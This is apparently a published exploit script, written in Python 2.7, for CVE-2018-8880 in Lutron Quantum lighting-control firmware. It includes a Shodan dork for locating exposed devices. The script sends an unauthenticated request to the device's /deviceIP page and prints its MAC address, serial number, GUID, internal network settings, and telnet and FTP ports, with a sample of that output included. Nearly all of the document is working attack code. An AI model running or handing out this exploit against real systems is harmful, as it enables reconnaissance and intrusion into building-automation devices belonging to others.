'''

# Exploit Title: Login bypass and data leak - Lutron Quantum 2.0 - 3.2.243 firmware
# Date: 20-03-2018
# Exploit Author: David Castro
# Contact: https://twitter.com/SadFud75
# Vendor Homepage: http://www.lutron.com
# Software Link: http://www.lutron.com/en-US/Products/Pages/WholeBuildingSystems/Quantum/Overview.aspx
# Version: Lutron Quantum 2.0 - 3.2.243 firmware
# CVE : CVE-2018-8880
# Shodan dork: html:"<h1>LUTRON</h1>"

Python 2.7 Output:

Leaking data from HOST
[+] Device info:

MAC: 000FE702A999
PRODUCT FAMILY: Gulliver
PRODUCT TYPE: Processor
SERIAL NUMBER: 007B24B4
GUID: 0DFB959BD0D8784DA9501B958F099779
CODE VERSION: 7.5.0

[+] Network info:

INTERNAL IP: 192.168.0.2
SUBNET MASK: 255.255.255.0
GATEWAY: 192.168.0.1
TELNET PORT: 23
FTP PORT: 21
REMOTE PORT: 51023

[+] Done.

'''


import requests
from bs4 import BeautifulSoup

ip = raw_input("Enter target ip: ")
port = raw_input("Enter target port: ")

print 'Leaking data from ' + 'http://' + ip + ":" + port
r = requests.get('http://' + ip + ":" + port + '/deviceIP')
resultado = r.text
parseado = BeautifulSoup(resultado, "lxml")

print '[+] Device info:'
print ''
print 'MAC: ' + parseado.find('input', {'name': 'MacAddr'}).get('value')
print 'PRODUCT FAMILY: ' + parseado.find('input', {'name': 'PRODFAM'}).get('value')
print 'PRODUCT TYPE: ' + parseado.find('input', {'name': 'PRODTYPE'}).get('value')
print 'SERIAL NUMBER: ' + parseado.find('input', {'name': 'SERNUM'}).get('value')
print 'GUID: ' + parseado.find('input', {'name': 'GUID'}).get('value')
print 'CODE VERSION: ' + parseado.find('input', {'name': 'CODEVER'}).get('value')
print ''
print '[+] Network info:'
print ''
print 'INTERNAL IP: ' + parseado.find('input', {'name': 'IPADDR'}).get('value')
print 'SUBNET MASK: ' + parseado.find('input', {'name': 'SUBNETMK'}).get('value')
print 'GATEWAY: ' + parseado.find('input', {'name': 'GATEADDR'}).get('value')
print 'TELNET PORT: ' + parseado.find('input', {'name': 'TELPORT'}).get('value')
print 'FTP PORT: ' + parseado.find('input', {'name': 'FTPPORT'}).get('value')
print 'REMOTE PORT: ' + parseado.find('input', {'name': 'REMOTEPORT'}).get('value')
print ''
print '[+] Done.'
print ''